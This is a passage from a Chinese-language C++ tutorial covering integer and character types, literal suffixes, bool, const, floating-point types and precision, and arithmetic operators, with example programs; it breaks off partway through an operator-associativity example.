一般建议: 如果不需要存储负数，且需要更大的正数范围，或者变量逻辑上就是无符号的（如计数），使用 unsigned。 如果数值范围不大，且没有特殊内存或性能要求，int 是最常用的选择。 如果 int 可能不够大，使用 long long。long 在某些系统上可能和 int 大小相同，而 long long 保证至少64位。 只有在内存非常受限且确定数值很小时才使用 short。 为了明确性和跨平台兼容性，可以考虑使用 &lt;cstdint&gt; 中的固定宽度类型。 用法与示例 (选择): 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;cstdint&gt; // 包含固定宽度整数类型int main() &#123; // 场景 1: 存储学生年龄 (通常不大，非负) unsigned int studentAge = 20; // unsigned int 或 int 都可以，unsigned 更明确非负 // 场景 2: 循环计数器 (通常用 int) for (int i = 0; i &lt; 10; ++i) &#123; // ... &#125; // 场景 3: 存储文件大小 (可能非常大，非负) unsigned long long fileSize = 5000000000ULL; // 需要大范围，非负 // 场景 4: 需要精确 32 位有符号整数 (跨平台) int32_t preciseCounter = -123456789; // 场景 5: 内存受限，存储少量选项 (0-100) // short optionCode = 5; // 如果 short 足够且内存关键 std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; studentAge &lt;&lt; std::endl; std::cout &lt;&lt; &quot;File Size: &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Precise Counter: &quot; &lt;&lt; preciseCounter &lt;&lt; std::endl; return 0;&#125; 3.1.6 整型字面值整型字面值 (Integer Literal) 是直接写在代码中的整数常量，例如 10, 0, -5, 42。C++允许以不同的进制（基数）书写整型字面值： 十进制 (Decimal): 最常见的形式，以非零数字开头（除非是数字0本身）。例如：10, 255, 0, 12345。 八进制 (Octal): 以 0 开头。只包含数字 0-7。例如：012 (等于十进制的 10)，077 (等于十进制的 63)。现代C++中应谨慎使用，容易与十进制混淆。 十六进制 (Hexadecimal): 以 0x 或 0X 开头。包含数字 0-9 和字母 a-f (或 A-F)，大小写不敏感。例如：0xA (等于十进制的 10)，0xFF (等于十进制的 255)，0x1a2b。常用于表示内存地址或位模式。 二进制 (Binary) (C++14): 以 0b 或 0B 开头。只包含数字 0 和 1。例如：0b1010 (等于十进制的 10)，0b11111111 (等于十进制的 255)。 后缀 (Suffixes): 可以通过在字面值后面添加后缀来显式指定其类型： u 或 U: 表示 unsigned 类型 (unsigned int, unsigned long, unsigned long long)。 l 或 L: 表示 long 或 unsigned long 类型。 ll 或 LL: 表示 long long 或 unsigned long long 类型 (C++11)。 后缀可以组合使用，例如 ul, UL, ull, ULL, lu, llu 等（顺序和大小写不重要）。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int decimal_val = 100; int octal_val = 0144; // 1*64 + 4*8 + 4*1 = 64 + 32 + 4 = 100 (十进制) int hex_val = 0x64; // 6*16 + 4*1 = 96 + 4 = 100 (十进制) // int binary_val = 0b1100100; // C++14: 64 + 32 + 4 = 100 (十进制) std::cout &lt;&lt; &quot;Decimal: &quot; &lt;&lt; decimal_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Octal (0144): &quot; &lt;&lt; octal_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Hexadecimal (0x64): &quot; &lt;&lt; hex_val &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Binary (0b1100100): &quot; &lt;&lt; binary_val &lt;&lt; std::endl; // 需要 C++14 编译器 // 使用后缀 unsigned int u_val = 100U; long l_val = 200000L; unsigned long ul_val = 300000UL; long long ll_val = 4000000000LL; unsigned long long ull_val = 5000000000ULL; std::cout &lt;&lt; &quot;Unsigned int: &quot; &lt;&lt; u_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Long: &quot; &lt;&lt; l_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Unsigned long: &quot; &lt;&lt; ul_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Long long: &quot; &lt;&lt; ll_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Unsigned long long: &quot; &lt;&lt; ull_val &lt;&lt; std::endl; return 0;&#125; 3.1.7 C++如何确定常量的类型当你写下一个整型字面值（常量）而没有指定后缀时，C++编译器会根据其值来推断其类型。 规则: 十进制常量: 编译器会选择能容纳该值的最小的有符号类型，依次尝试：int, long, long long (C++11)。例如： 100 会被认为是 int (如果 int 能容纳)。 3000000000 会被认为是 long (如果 int 不能容纳但 long 可以)，或者 long long (如果 int 和 long 都不能容纳但 long long 可以)。 八进制或十六进制常量: 编译器会选择能容纳该值的最小类型，依次尝试：int, unsigned int, long, unsigned long, long long (C++11), unsigned long long (C++11)。注意这里包含了 unsigned 类型。 为什么要知道这个? 这在涉及类型转换和函数重载时可能很重要。如果你传递一个常量给函数，它的默认类型可能会影响哪个重载版本被调用。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;typeinfo&gt; // 用于 typeid (仅作演示)void process(int n) &#123; std::cout &lt;&lt; &quot;Processing int: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned int n) &#123; std::cout &lt;&lt; &quot;Processing unsigned int: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(long n) &#123; std::cout &lt;&lt; &quot;Processing long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned long n) &#123; std::cout &lt;&lt; &quot;Processing unsigned long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(long long n) &#123; // C++11 std::cout &lt;&lt; &quot;Processing long long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned long long n) &#123; // C++11 std::cout &lt;&lt; &quot;Processing unsigned long long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;int main() &#123; std::cout &lt;&lt; &quot;Type of 100: &quot;; process(100); // 通常调用 process(int) // 假设 int 是 32 位，最大值约 21 亿 std::cout &lt;&lt; &quot;Type of 3000000000: &quot;; // 如果 int 是 32 位，这个值超出了 int 范围 // 编译器会尝试 long 或 long long process(3000000000); // 可能调用 process(long) 或 process(long long) std::cout &lt;&lt; &quot;Type of 0xFFFFFFFF: &quot;; // 这个十六进制数 (等于 4294967295) // 如果 int 是 32 位，它超出了有符号 int 的范围 // 编译器会尝试 unsigned int, long, unsigned long... process(0xFFFFFFFF); // 可能调用 process(unsigned int) 或 process(unsigned long)等 // 使用后缀明确类型 std::cout &lt;&lt; &quot;Type of 150L: &quot;; process(150L); // 明确调用 process(long) std::cout &lt;&lt; &quot;Type of 200U: &quot;; process(200U); // 明确调用 process(unsigned int) std::cout &lt;&lt; &quot;Type of 5000000000LL: &quot;; process(5000000000LL); // 明确调用 process(long long) return 0;&#125; 关键点: 如果不确定常量会被推断成什么类型，或者想要确保它是特定类型，最好使用后缀。 3.1.8 char类型：字符和小整数char 类型是另一种整型类型，它被设计用来存储**字符 (character)**，例如字母、数字、标点符号等。 特点: 大小: char 通常占用 1 个字节（8位）的内存。这是C++标准保证的 (sizeof(char) 总是 1)。 字符表示: 计算机内部使用数值编码（如 ASCII 或 Unicode 的子集）来表示字符。char 变量存储的是这些字符对应的整数编码。 字符字面值: 使用单引号 &#39; &#39; 括起来表示单个字符字面值，例如 &#39;A&#39;, &#39;a&#39;, &#39;5&#39;, &#39;?&#39;, &#39;\\n&#39; (换行符)。 整数类型: char 本质上仍然是一个整数类型。它可以参与算术运算。 有符号 vs 无符号: char 类型具体是有符号 (signed char) 还是无符号 (unsigned char) 取决于编译器实现。如果你需要明确，可以直接使用 signed char 或 unsigned char。 signed char: 范围通常是 -128 到 127。 unsigned char: 范围通常是 0 到 255。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;int main() &#123; char grade = &#x27;A&#x27;; // 存储字符 &#x27;A&#x27; char initial = &#x27;J&#x27;; char symbol = &#x27;$&#x27;; char newline = &#x27;\\n&#x27;; // 存储换行符 (转义序列) std::cout &lt;&lt; &quot;Your grade is: &quot; &lt;&lt; grade &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Symbol: &quot; &lt;&lt; symbol &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Printing a newline:&quot; &lt;&lt; newline; // 输出一个换行 std::cout &lt;&lt; &quot;After newline.&quot; &lt;&lt; std::endl; // cout 会将 char 类型解释为字符进行打印 // 如果想看到字符对应的整数编码，需要进行类型转换 std::cout &lt;&lt; &quot;The integer code for &#x27;A&#x27; is: &quot; &lt;&lt; int(grade) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;The integer code for &#x27;$&#x27; is: &quot; &lt;&lt; static_cast&lt;int&gt;(symbol) &lt;&lt; std::endl; // char 作为小整数使用 char small_num = 65; // 65 是 ASCII 码中 &#x27;A&#x27; 的值 std::cout &lt;&lt; &quot;Character with code 65: &quot; &lt;&lt; small_num &lt;&lt; std::endl; // 输出 &#x27;A&#x27; // 算术运算 char next_char = grade + 1; // &#x27;A&#x27; 的编码加 1 得到 &#x27;B&#x27; 的编码 std::cout &lt;&lt; &quot;Character after &#x27;A&#x27;: &quot; &lt;&lt; next_char &lt;&lt; std::endl; // 输出 &#x27;B&#x27; // 输入字符 char response; std::cout &lt;&lt; &quot;Enter a character: &quot;; std::cin &gt;&gt; response; // 读取一个字符 std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; response &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Its code is: &quot; &lt;&lt; int(response) &lt;&lt; std::endl; // 明确使用 signed/unsigned char signed char sc = -5; unsigned char uc = 250; std::cout &lt;&lt; &quot;Signed char: &quot; &lt;&lt; int(sc) &lt;&lt; std::endl; // 转换为 int 打印数值 std::cout &lt;&lt; &quot;Unsigned char: &quot; &lt;&lt; int(uc) &lt;&lt; std::endl; return 0;&#125; 转义序列 (Escape Sequence):以反斜杠 \\ 开头的特殊字符序列，用于表示无法直接输入的字符或具有特殊含义的字符。常用转义序列包括： \\n: 换行符 \\t: 水平制表符 (Tab) \\r: 回车符 \\\\: 反斜杠本身 \\&#39;: 单引号 \\&quot;: 双引号 \\?: 问号 \\0: 空字符 (Null character) \\xhh: 用两位十六进制数 hh 表示字符 \\ooo: 用最多三位八进制数 ooo 表示字符 3.1.9 bool类型bool 类型是C++中的布尔 (Boolean) 类型，用于表示逻辑值：真 (true) 或 **假 (false)**。 特点: 取值: bool 变量只能存储两个值：true 和 false。这两个是C++关键字。 整数转换: 在需要整数的地方，true 会被转换为 1，false 会被转换为 0。 在需要布尔值的地方，任何非零整数值会被转换为 true，零值会被转换为 false。指针类型也可以转换为 bool（空指针为 false，非空指针为 true）。 大小: bool 类型的大小没有严格规定，但通常是 1 个字节，即使它只需要 1 位来存储信息。 用途: 主要用于存储条件判断（如 if 语句、循环条件）的结果。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;int main() &#123; bool isReady = true; // 声明并初始化为 true bool hasError = false; // 声明并初始化为 false bool isEmpty; // 未初始化 (值不确定) isEmpty = false; // 赋值 std::cout &lt;&lt; &quot;isReady (default output): &quot; &lt;&lt; isReady &lt;&lt; std::endl; // 通常输出 1 std::cout &lt;&lt; &quot;hasError (default output): &quot; &lt;&lt; hasError &lt;&lt; std::endl; // 通常输出 0 std::cout &lt;&lt; &quot;isEmpty (default output): &quot; &lt;&lt; isEmpty &lt;&lt; std::endl; // 输出 0 // 使用 std::boolalpha 控制符以 &quot;true&quot;/&quot;false&quot; 形式输出 std::cout &lt;&lt; std::boolalpha; std::cout &lt;&lt; &quot;isReady (boolalpha): &quot; &lt;&lt; isReady &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;hasError (boolalpha): &quot; &lt;&lt; hasError &lt;&lt; std::endl; // 输出 false std::cout &lt;&lt; &quot;isEmpty (boolalpha): &quot; &lt;&lt; isEmpty &lt;&lt; std::endl; // 输出 false std::cout &lt;&lt; std::noboolalpha; // 关闭 boolalpha 格式 // bool 和整数转换 int ready_int = isReady; // ready_int 变为 1 int error_int = hasError; // error_int 变为 0 std::cout &lt;&lt; &quot;isReady as int: &quot; &lt;&lt; ready_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;hasError as int: &quot; &lt;&lt; error_int &lt;&lt; std::endl; bool from_int_non_zero = 100; // 100 (非零) 转换为 true bool from_int_zero = 0; // 0 转换为 false std::cout &lt;&lt; std::boolalpha; std::cout &lt;&lt; &quot;Bool from 100: &quot; &lt;&lt; from_int_non_zero &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;Bool from 0: &quot; &lt;&lt; from_int_zero &lt;&lt; std::endl; // 输出 false // 在条件语句中使用 if (isReady) &#123; std::cout &lt;&lt; &quot;System is ready.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;System is not ready.&quot; &lt;&lt; std::endl; &#125; if (!hasError) &#123; // ! 是逻辑非运算符 std::cout &lt;&lt; &quot;No errors detected.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;An error occurred.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 3.2 const限定符现在我们来探讨一种在C++中创建常量 (Constant) 的更可靠的方法：使用 const 限定符。常量是指在程序运行期间其值不能被修改的量。 const 是一个**类型限定符 (Type Qualifier)**，它用于修改变量的声明，使其成为只读。 作用: 创建符号常量: const 允许你为常量值（如圆周率、最大尝试次数等）赋予一个有意义的名称，提高代码的可读性和可维护性。 防止意外修改: 一旦变量被声明为 const 并初始化后，编译器会阻止任何试图修改该变量值的代码。这有助于防止因意外赋值而导致的错误。 类型安全: 与使用 #define 创建宏常量相比，const 常量具有明确的数据类型，编译器可以对其进行类型检查，更加安全。 作用域: const 常量遵循标准的作用域规则（例如，在函数内部定义的 const 常量只在该函数内有效），而 #define 宏是全局替换。 声明和初始化: 声明 const 变量的语法是在类型名前或类型名后加上 const 关键字。关键在于，const 变量必须在声明时进行初始化，因为之后就不能再给它赋值了。 123const type variableName = value; // 或者type const variableName = value; // 两种写法等效，第一种更常见 用法与示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; // 声明并初始化 const 变量 const int MONTHS_IN_YEAR = 12; // 常量，表示一年中的月份数 const double PI = 3.14159; const char* GREETING = &quot;Hello, world!&quot;; // 指向常量字符串的常量指针 (更复杂，后续章节详解) // 尝试修改 const 变量会导致编译错误 // MONTHS_IN_YEAR = 13; // 错误! 不能给 const 变量赋值 std::cout &lt;&lt; &quot;Months in a year: &quot; &lt;&lt; MONTHS_IN_YEAR &lt;&lt; std::endl; double radius = 5.0; double circumference = 2 * PI * radius; // 使用 const 常量 PI std::cout &lt;&lt; &quot;Circumference: &quot; &lt;&lt; circumference &lt;&lt; std::endl; // const 常量也遵循作用域规则 if (true) &#123; const int MAX_TRIES = 3; // 只在 if 块内有效 std::cout &lt;&lt; &quot;Max tries inside block: &quot; &lt;&lt; MAX_TRIES &lt;&lt; std::endl; &#125; // std::cout &lt;&lt; MAX_TRIES; // 错误! MAX_TRIES 在此作用域外不可见 // 必须在声明时初始化 // const int DAYS_IN_WEEK; // 错误! const 变量需要初始化 // DAYS_IN_WEEK = 7; return 0;&#125; const 与 #define 的比较: 在 C 语言中，通常使用 #define 预处理器指令来创建符号常量： 1#define MONTHS_IN_YEAR 12 // C 风格宏定义 虽然 #define 也能达到类似目的，但 const 在 C++ 中通常是更好的选择： 类型安全: const 常量有明确的数据类型，编译器会进行类型检查。#define 只是简单的文本替换，没有类型信息，可能导致意外错误。 作用域: const 常量遵循 C++ 的作用域规则，可以创建局部常量。#define 宏通常是全局的（从定义点到文件尾），容易造成命名冲突。 调试: const 常量在调试器中通常可见，有符号名。#define 宏在编译前就被替换掉了，调试时可能只能看到替换后的字面值。 类作用域: const 可以用于定义类作用域内的常量（类成员），而 #define 不能直接做到这一点。 一般建议: 在 C++ 中，优先使用 const 来定义符号常量，而不是 #define。 3.3 浮点数浮点数是C++中用于表示带小数部分的数字（实数）的类型。它们可以表示非常大或非常小的数值，以及整数无法表示的小数。 3.3.1 书写浮点数C++允许使用两种方式来书写浮点字面值（常量）： 标准小数点表示法 (Standard Decimal Point Notation): 包含一个小数点。 例如：12.34, 0.0, 99., .5 (等同于 0.5), -1.67。 E表示法 (E Notation) 或科学记数法 (Scientific Notation): 用于表示非常大或非常小的数。 格式为：mantissaEexponent 或 mantissaeexponent。 mantissa (尾数) 是一个数字（可以带小数点）。 E 或 e 表示 “乘以10的…次幂”。 exponent (指数) 是一个整数（可以为负）。 例如： 3.45E6 表示 3.45 * 106 (即 3,450,000)。 2.5e-4 表示 2.5 * 10-4 (即 0.00025)。 9E12 表示 9 * 1012。 -1.23e+3 表示 -1.23 * 103 (即 -1230)。 注意: E表示法中，E 或 e 前后不能有空格。 指数必须是整数。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; // 标准小数点表示法 double price = 99.99; double temperature = -15.5; double small_fraction = .25; // 等同于 0.25 // E 表示法 double earth_mass = 5.972E24; // 地球质量 (kg) double electron_charge = -1.602e-19; // 电子电荷 (库仑) double large_number = 1.0e9; // 10 亿 std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Temperature: &quot; &lt;&lt; temperature &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Small fraction: &quot; &lt;&lt; small_fraction &lt;&lt; std::endl; // 默认情况下，cout 可能对非常大或小的数自动使用科学记数法输出 std::cout &lt;&lt; &quot;Earth mass: &quot; &lt;&lt; earth_mass &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Electron charge: &quot; &lt;&lt; electron_charge &lt;&lt; &quot; C&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Large number: &quot; &lt;&lt; large_number &lt;&lt; std::endl; // 可以使用 &lt;iomanip&gt; 控制输出格式 (后续章节会详细介绍) std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); // 设置为定点表示法 std::cout &lt;&lt; &quot;Large number (fixed): &quot; &lt;&lt; large_number &lt;&lt; std::endl; return 0;&#125; 3.3.2 浮点类型C++提供了三种浮点类型，它们在精度（有效位数）和存储范围上有所不同： float: 单精度浮点数。通常占用 4 个字节 (32位)。精度较低，范围较小。 double: 双精度浮点数。通常占用 8 个字节 (64位)。精度和范围比 float 大很多。这是C++中最常用的浮点类型，浮点常量（如 3.14）默认就是 double 类型。 long double: 扩展精度浮点数。通常占用 8、10、12 或 16 个字节，具体取决于编译器和系统。提供最高的精度和最大的范围。 精度和范围: 精度 (Precision): 指的是可以表示的有效数字的位数。 float 通常保证至少 6 位有效数字。 double 通常保证至少 15 位有效数字。 long double 通常提供比 double 更高的精度。 范围 (Range): 指的是可以表示的最小和最大数值。double 的范围远大于 float，long double 的范围通常更大。 可以使用 &lt;cfloat&gt; (或 C 语言的 &lt;float.h&gt;) 头文件中的常量来查看具体系统的精度和范围限制（例如 FLT_DIG, DBL_DIG, LDBL_DIG 表示有效位数）。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cfloat&gt; // 包含浮点数限制信息int main() &#123; // 查看各种类型占用的字节数 std::cout &lt;&lt; &quot;Size of float: &quot; &lt;&lt; sizeof(float) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of double: &quot; &lt;&lt; sizeof(double) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long double: &quot; &lt;&lt; sizeof(long double) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 查看精度 (有效位数) std::cout &lt;&lt; &quot;Digits of precision for float: &quot; &lt;&lt; FLT_DIG &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Digits of precision for double: &quot; &lt;&lt; DBL_DIG &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Digits of precision for long double: &quot; &lt;&lt; LDBL_DIG &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 声明和初始化 float f_pi = 3.14159265f; // f 后缀表示 float double d_pi = 3.141592653589793; // 默认是 double long double ld_pi = 3.14159265358979323846L; // L 后缀表示 long double std::cout.precision(20); // 设置 cout 输出精度以便观察差异 std::cout &lt;&lt; &quot;float pi: &quot; &lt;&lt; f_pi &lt;&lt; std::endl; std::cout &lt;&lt; &quot;double pi: &quot; &lt;&lt; d_pi &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long double pi: &quot; &lt;&lt; ld_pi &lt;&lt; std::endl; return 0;&#125; 选择建议: 除非有特别的内存或性能考虑，并且确定 float 的精度足够，否则**优先使用 double**。它是C++浮点计算的常用类型。 当需要极高的精度或非常大的数值范围时，使用 long double。 3.3.3 浮点常量浮点常量（字面值）就是直接写在代码中的浮点数值，例如 3.14, 1.0, -2.5e8。 默认类型:默认情况下，C++将不带后缀的浮点常量视为 double 类型。 后缀 (Suffixes):可以通过添加后缀来显式指定浮点常量的类型： f 或 F: 表示 float 类型。 l 或 L: 表示 long double 类型。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;typeinfo&gt; // 用于 typeid (仅作演示)int main() &#123; // 默认类型是 double std::cout &lt;&lt; &quot;Type of 3.14: &quot; &lt;&lt; typeid(3.14).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of 1.0e-5: &quot; &lt;&lt; typeid(1.0e-5).name() &lt;&lt; std::endl; // 使用后缀指定类型 std::cout &lt;&lt; &quot;Type of 3.14f: &quot; &lt;&lt; typeid(3.14f).name() &lt;&lt; std::endl; // float std::cout &lt;&lt; &quot;Type of 3.14F: &quot; &lt;&lt; typeid(3.14F).name() &lt;&lt; std::endl; // float std::cout &lt;&lt; &quot;Type of 3.14l: &quot; &lt;&lt; typeid(3.14l).name() &lt;&lt; std::endl; // long double std::cout &lt;&lt; &quot;Type of 3.14L: &quot; &lt;&lt; typeid(3.14L).name() &lt;&lt; std::endl; // long double // 赋值时的类型匹配 float price = 99.99f; // 使用 f 后缀避免从 double 到 float 的可能精度损失警告 double weight = 75.5; // 75.5 是 double, 赋值给 double 变量 long double distance = 1.23e10L; // 使用 L 后缀 std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Distance: &quot; &lt;&lt; distance &lt;&lt; std::endl; return 0;&#125; (注意: typeid().name() 的输出可能因编译器而异，但可以大致看出类型) 在将常量赋给 float 变量时，使用 f 或 F 后缀是一个好习惯，可以避免编译器产生关于从 double 转换到 float 可能丢失精度的警告。 3.3.4 浮点数的优缺点浮点数在表示实数方面非常有用，但也存在一些固有的限制和需要注意的地方。 优点: 表示范围广: 可以表示比整型大得多或小得多的数值。 表示小数: 可以表示整数无法表示的小数部分。 标准化: 大多数现代计算机都遵循 IEEE 754 标准来表示和处理浮点数，这提高了可移植性。 缺点: 精度限制: 浮点数只能近似地表示大多数实数。由于内部使用二进制表示，某些在十进制下看起来很精确的小数（如 0.1）在二进制浮点表示中可能是无限循环小数，只能存储一个近似值。这会导致微小的**舍入误差 (Rounding Error)**。 比较困难: 由于精度限制，直接使用 == 来比较两个浮点数是否相等通常是不可靠的。微小的舍入误差可能导致逻辑上应该相等的两个数在内部表示上略有不同。比较浮点数时，通常应该检查它们的差值是否在一个很小的容差 (Tolerance) 范围内。 运算速度: 浮点运算通常比整型运算慢（尽管现代处理器有专门的浮点单元来优化）。 特殊值: IEEE 754 标准定义了一些特殊值，如 NaN (Not a Number，例如 0.0/0.0 的结果) 和无穷大 (Infinity，例如 1.0/0.0 的结果)，需要在使用时注意处理。 用法与示例 (精度问题和比较): 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;cmath&gt; // 为了 fabs (计算绝对值)#include &lt;iomanip&gt; // 为了 setprecisionint main() &#123; // 精度问题示例 double a = 0.1; double b = 0.2; double sum = a + b; // 理论上应该是 0.3 std::cout &lt;&lt; std::setprecision(20); // 显示更多小数位 std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; std::endl; std::cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; std::endl; std::cout &lt;&lt; &quot;a + b = &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出可能不是精确的 0.3 if (sum == 0.3) &#123; std::cout &lt;&lt; &quot;Comparison (==): sum is equal to 0.3&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Comparison (==): sum is NOT equal to 0.3&quot; &lt;&lt; std::endl; // 很可能执行这里 &#125; // 正确的比较方法：检查差值是否在容差范围内 const double TOLERANCE = 1e-9; // 定义一个很小的容差值 if (std::fabs(sum - 0.3) &lt; TOLERANCE) &#123; std::cout &lt;&lt; &quot;Comparison (tolerance): sum is close enough to 0.3&quot; &lt;&lt; std::endl; // 应该执行这里 &#125; else &#123; std::cout &lt;&lt; &quot;Comparison (tolerance): sum is NOT close enough to 0.3&quot; &lt;&lt; std::endl; &#125; // 另一个例子 float x = 1.0f / 3.0f; float y = 3.0f * x; std::cout &lt;&lt; &quot;y = 3.0f * (1.0f / 3.0f) = &quot; &lt;&lt; y &lt;&lt; std::endl; // 可能不是精确的 1.0 return 0;&#125; 总结: 在使用浮点数时，要意识到它们是近似值，并避免直接进行相等性比较。在需要精确计算（如金融计算）的场合，可能需要使用专门的库或定点数表示法。对于大多数科学和工程计算，double 提供了足够的精度和范围。 3.4 C++算术运算符C++提供了丰富的运算符来执行算术计算。本节将介绍基本的算术运算符、它们的优先级和结合性、整数除法和求模运算、类型转换以及 C++11 引入的 auto 类型推断。 基本算术运算符: +: 加法 (Addition) -: 减法 (Subtraction) *: 乘法 (Multiplication) /: 除法 (Division) %: 求模 (Modulo) 或求余 (Remainder) 这些运算符可以用于 C++ 的所有数值类型（整型和浮点型），但求模运算符 % 通常只用于整数类型。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;int main() &#123; double price = 15.50; double tax_rate = 0.08; int quantity = 3; int total_items = 17; int items_per_box = 5; // 加法 double total_price = price * quantity + 5.0; // 假设有 5 元附加费 std::cout &lt;&lt; &quot;Total price (with fee): &quot; &lt;&lt; total_price &lt;&lt; std::endl; // 减法 double price_before_tax = price / (1 + tax_rate); // 假设 price 已含税 std::cout &lt;&lt; &quot;Price before tax: &quot; &lt;&lt; price_before_tax &lt;&lt; std::endl; // 乘法 double tax_amount = price_before_tax * tax_rate; std::cout &lt;&lt; &quot;Tax amount: &quot; &lt;&lt; tax_amount &lt;&lt; std::endl; // 除法 (浮点数) double average_price = total_price / quantity; std::cout &lt;&lt; &quot;Average price per item: &quot; &lt;&lt; average_price &lt;&lt; std::endl; // 除法 (整数) - 见 3.4.2 int full_boxes = total_items / items_per_box; std::cout &lt;&lt; &quot;Full boxes: &quot; &lt;&lt; full_boxes &lt;&lt; std::endl; // 输出 3 // 求模 - 见 3.4.3 int remaining_items = total_items % items_per_box; std::cout &lt;&lt; &quot;Remaining items: &quot; &lt;&lt; remaining_items &lt;&lt; std::endl; // 输出 2 // 一元减法 (取负) double discount = -10.0; std::cout &lt;&lt; &quot;Discount: &quot; &lt;&lt; discount &lt;&lt; std::endl; // 一元加法 (通常无效果) double positive_value = +price; std::cout &lt;&lt; &quot;Positive value: &quot; &lt;&lt; positive_value &lt;&lt; std::endl; return 0;&#125; 3.4.1 运算符优先级和结合性当一个表达式中包含多个运算符时，优先级 (Precedence) 和 结合性 (Associativity) 决定了运算的执行顺序。 优先级: 哪个运算符先执行。优先级高的运算符先于优先级低的运算符执行。例如，乘法和除法的优先级高于加法和减法。 结合性: 当多个具有相同优先级的运算符连续出现时，它们的执行顺序。 左结合性 (Left-to-Right): 运算从左向右执行。大多数二元算术运算符（+, -, *, /, %）都是左结合的。例如 a - b + c 等价于 (a - b) + c。 右结合性 (Right-to-Left): 运算从右向左执行。赋值运算符 = 和一元运算符（如取负 -）是右结合的。例如 a = b = c 等价于 a = (b = c)。 常见算术运算符优先级 (由高到低): 一元运算符: + (正号), - (负号) - (右结合) 乘法、除法、求模: *, /, % - (左结合) 加法、减法: +, - - (左结合) 赋值运算符: = - (右结合) 使用括号: 可以使用圆括号 () 来覆盖默认的优先级和结合性，强制按特定顺序执行运算。括号内的表达式总是最先计算。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int a = 5, b = 8, c = 3, d = 2; // 优先级: * 高于 + int result1 = a + b * c; // 等价于 a + (b * c) = 5 + (8 * 3) = 5 + 24 = 29 std::cout &lt;&lt; &quot;a + b * c = &quot; &lt;&lt; result1 &lt;&lt; std::endl; // 使用括号改变顺序 int result2 = (a + b) * c; // (5 + 8) * 3 = 13 * 3 = 39 std::cout &lt;&lt; &quot;(a + b) * c = &quot; &lt;&lt; result2 &lt;&lt; std::endl; // 结合性 (左结合): / 和 * 优先级相同 int result3 = b / c * d; // 等价于 (b / c) * d = (8 / 3) * d = 2 * d = 2 * 2 = 4 (整数除法) std::cout &lt;&lt; &quot;b / c * d = &quot; &lt;&lt; result3 &lt;&lt; std::endl; // 结合性 (右结合): 赋值 int x, y, z; x = y = z = 10; // 等价于 x = (y = (z = 10)) std::cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; &quot;, z=&quot; &lt;&lt; z &lt;&lt; std::endl; // 输出 x=10, y=10, z=10 // 结合性 (右结合): 一元负号 int val = 